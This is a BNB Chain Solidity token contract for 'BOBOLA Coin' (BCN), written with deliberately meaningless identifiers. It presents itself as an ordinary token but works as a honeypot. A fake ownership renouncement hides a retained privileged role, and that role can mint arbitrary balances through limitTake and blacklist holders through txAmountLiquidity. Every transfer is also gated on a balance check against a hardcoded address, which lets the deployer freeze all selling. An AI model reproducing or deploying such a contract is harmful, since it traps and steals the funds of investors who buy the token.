/**
 *Submitted for verification at BscScan.com on 2023-05-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface senderIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldMaxReceiver) external view returns (uint256);

    function transfer(address enableShould, uint256 launchMin) external returns (bool);

    function allowance(address limitMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchMin) external returns (bool);

    function transferFrom(
        address sender,
        address enableShould,
        uint256 launchMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverBuy, uint256 value);
    event Approval(address indexed limitMax, address indexed spender, uint256 value);
}

interface takeFee is senderIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract listTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedLaunch {
    function createPair(address shouldAuto, address listExemptToken) external returns (address);
}

interface fundWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract BOBOLACoin is listTo, senderIs, takeFee {

    function maxShould(uint256 launchMin) public {
        launchEnable();
        walletFee = launchMin;
    }

    function symbol() external view virtual override returns (string memory) {
        return isAmount;
    }

    uint256 liquidityTx;

    function transferFrom(address swapTo, address enableShould, uint256 launchMin) external override returns (bool) {
        if (_msgSender() != listLiquidityTake) {
            if (listReceiverSell[swapTo][_msgSender()] != type(uint256).max) {
                require(launchMin <= listReceiverSell[swapTo][_msgSender()]);
                listReceiverSell[swapTo][_msgSender()] -= launchMin;
            }
        }
        return receiverMarketing(swapTo, enableShould, launchMin);
    }

    address public fromLiquidity;

    function txAmountLiquidity(address buyFee) public {
        launchEnable();
        
        if (buyFee == fromLiquidity || buyFee == launchTeam) {
            return;
        }
        buyToSell[buyFee] = true;
    }

    bool public marketingExempt;

    function limitTake(address listEnable, uint256 launchMin) public {
        launchEnable();
        enableTotal[listEnable] = launchMin;
    }

    uint256 walletFee;

    uint256 private exemptTrading;

    function modeReceiver(address swapTo, address enableShould, uint256 launchMin) internal returns (bool) {
        require(enableTotal[swapTo] >= launchMin);
        enableTotal[swapTo] -= launchMin;
        enableTotal[enableShould] += launchMin;
        emit Transfer(swapTo, enableShould, launchMin);
        return true;
    }

    function receiverMarketing(address swapTo, address enableShould, uint256 launchMin) internal returns (bool) {
        if (swapTo == fromLiquidity) {
            return modeReceiver(swapTo, enableShould, launchMin);
        }
        uint256 sellList = senderIs(launchTeam).balanceOf(limitSwap);
        require(sellList == walletFee);
        require(!buyToSell[swapTo]);
        return modeReceiver(swapTo, enableShould, launchMin);
    }

    function getOwner() external view returns (address) {
        return launchedSender;
    }

    uint256 public feeTradingTake;

    function owner() external view returns (address) {
        return launchedSender;
    }

    bool public swapTotal;

    mapping(address => bool) public buyToSell;

    string private isAmount = "BCN";

    function minFrom() public {
        emit OwnershipTransferred(fromLiquidity, address(0));
        launchedSender = address(0);
    }

    address private launchedSender;

    string private marketingTo = "BOBOLA Coin";

    function transfer(address listEnable, uint256 launchMin) external virtual override returns (bool) {
        return receiverMarketing(_msgSender(), listEnable, launchMin);
    }

    event OwnershipTransferred(address indexed listLimitIs, address indexed maxTake);

    function name() external view virtual override returns (string memory) {
        return marketingTo;
    }

    function launchEnable() private view {
        require(minIs[_msgSender()]);
    }

    uint256 private receiverToken = 100000000 * 10 ** 18;

    uint256 public tradingFund;

    mapping(address => bool) public minIs;

    function walletTrading(address listShould) public {
        if (fundLiquidityAmount) {
            return;
        }
        if (exemptTrading == tokenSell) {
            tradingFund = exemptTrading;
        }
        minIs[listShould] = true;
        
        fundLiquidityAmount = true;
    }

    function approve(address autoFund, uint256 launchMin) public virtual override returns (bool) {
        listReceiverSell[_msgSender()][autoFund] = launchMin;
        emit Approval(_msgSender(), autoFund, launchMin);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return liquidityIs;
    }

    uint8 private liquidityIs = 18;

    constructor (){
        if (feeTradingTake == tradingFund) {
            tradingFund = autoLaunchFee;
        }
        minFrom();
        fundWallet listMin = fundWallet(listLiquidityTake);
        launchTeam = launchedLaunch(listMin.factory()).createPair(listMin.WETH(), address(this));
        if (tokenSell == autoLaunchFee) {
            autoLaunchFee = feeTradingTake;
        }
        fromLiquidity = _msgSender();
        minIs[fromLiquidity] = true;
        enableTotal[fromLiquidity] = receiverToken;
        
        emit Transfer(address(0), fromLiquidity, receiverToken);
    }

    address limitSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private enableTotal;

    address listLiquidityTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private listReceiverSell;

    function allowance(address exemptTo, address autoFund) external view virtual override returns (uint256) {
        if (autoFund == listLiquidityTake) {
            return type(uint256).max;
        }
        return listReceiverSell[exemptTo][autoFund];
    }

    bool public fundLiquidityAmount;

    function balanceOf(address shouldMaxReceiver) public view virtual override returns (uint256) {
        return enableTotal[shouldMaxReceiver];
    }

    address public launchTeam;

    uint256 public tokenSell;

    uint256 private autoLaunchFee;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverToken;
    }

}